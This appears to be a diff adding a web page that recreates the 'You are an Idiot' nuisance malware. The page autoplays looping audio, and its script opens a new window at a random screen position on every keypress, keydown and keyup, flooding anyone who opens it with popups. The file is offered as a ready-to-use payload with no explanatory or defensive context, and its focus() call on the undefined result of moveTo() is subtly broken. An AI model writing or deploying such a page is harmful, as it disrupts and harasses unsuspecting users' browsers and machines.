@@ -1,0 +1,27 @@
+<!doctype html>
+<html>
+<head>
+<title>You are an Idiot</title>
+<link rel="stylesheet" type="text/css" href="style.css"/>
+<link rel="icon" href="263A.png">
+</head>
+<body>
+<div>
+<audio loop src="idiot.mp3" autoplay>
+</div>
+<script type="text/javascript">
+document.onkeypress = function() {
+var w = window.open("idiottwin.html", '_blank', 'location=yes,scrollbars=yes,resizeable=0,status=yes').moveTo(Math.floor(Math.random() * window.screen.availWidth) + 1,Math.floor(Math.random() * window.screen.availHeight) + 1  );
+w.focus()
+}
+document.onkeydown = function() {
+var w = window.open("idiottwin.html", '_blank', 'location=yes,scrollbars=yes,resizeable=0,status=yes').moveTo(Math.floor(Math.random() * window.screen.availWidth) + 1,Math.floor(Math.random() * window.screen.availHeight) + 1  );
+w.focus()
+}
+document.onkeyup = function() {
+var w = window.open("idiottwin.html", '_blank', 'location=yes,scrollbars=yes,resizeable=0,status=yes').moveTo(Math.floor(Math.random() * window.screen.availWidth) + 1,Math.floor(Math.random() * window.screen.availHeight) + 1  );
+w.focus()
+}
+</script>
+</body>
+</html>
